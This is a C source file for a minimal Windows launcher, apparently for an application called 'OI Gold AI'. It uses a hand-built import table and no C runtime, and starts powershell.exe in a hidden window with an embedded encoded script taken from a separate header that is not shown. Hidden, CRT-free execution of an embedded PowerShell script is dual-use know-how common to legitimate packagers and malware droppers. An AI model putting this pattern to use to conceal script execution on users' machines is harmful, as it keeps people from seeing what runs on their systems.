typedef unsigned short wchar;
typedef unsigned int dword;
typedef void *handle;

typedef struct {
    dword cb;
    wchar *reserved, *desktop, *title;
    dword x, y, x_size, y_size, x_chars, y_chars, fill, flags;
    unsigned short show, reserved_size;
    unsigned char *reserved_bytes;
    handle stdin_handle, stdout_handle, stderr_handle;
} startup_info;

typedef struct {
    handle process, thread;
    dword process_id, thread_id;
} process_info;

typedef dword (*system_directory_fn)(wchar *, dword);
typedef int (*create_process_fn)(const wchar *, wchar *, void *, void *, int, dword, void *, const wchar *, startup_info *, process_info *);
typedef dword (*wait_fn)(handle, dword);
typedef int (*exit_code_fn)(handle, dword *);
typedef int (*close_fn)(handle);
typedef void (*exit_fn)(dword);
typedef int (*message_fn)(handle, const wchar *, const wchar *, dword);

struct imports {
    system_directory_fn system_directory;
    create_process_fn create_process;
    wait_fn wait;
    exit_code_fn exit_code;
    close_fn close;
    exit_fn exit_process;
    void *kernel_terminator;
    message_fn message;
    void *user_terminator;
};
__attribute__((section(".imports"))) volatile struct imports win = {0};
__attribute__((section(".imports"))) unsigned char import_space[1024] = {1};

#include "payload.h"

static wchar executable[512];
static wchar command[32767];
static startup_info startup;
static process_info child;

static void append(wchar **out, const wchar *text) {
    while (*text) *(*out)++ = *text++;
    **out = 0;
}

void start(void) {
    const wchar *title = L"OI Gold AI";
    dword size = win.system_directory(executable, 460);
    if (!size || size >= 460) {
        win.message(0, L"Cannot locate Windows PowerShell.", title, 16);
        win.exit_process(1);
        return;
    }
    wchar *out = executable + size;
    append(&out, L"\\WindowsPowerShell\\v1.0\\powershell.exe");
    out = command;
    append(&out, L"\"");
    append(&out, executable);
    append(&out, L"\" -NoProfile -STA -Command \"");
    append(&out, encoded_script);
    append(&out, L"\"");

    startup.cb = sizeof(startup);
    if (!win.create_process(executable, command, 0, 0, 0, 0x08000000, 0, 0, &startup, &child)) {
        win.message(0, L"Cannot start Windows PowerShell.", title, 16);
        win.exit_process(1);
        return;
    }
    win.close(child.thread);
    win.wait(child.process, 0xffffffff);
    dword code = 1;
    win.exit_code(child.process, &code);
    win.close(child.process);
    if (code) win.message(0, L"The launcher stopped unexpectedly. Check Windows PowerShell availability.", title, 16);
    win.exit_process(code);
}
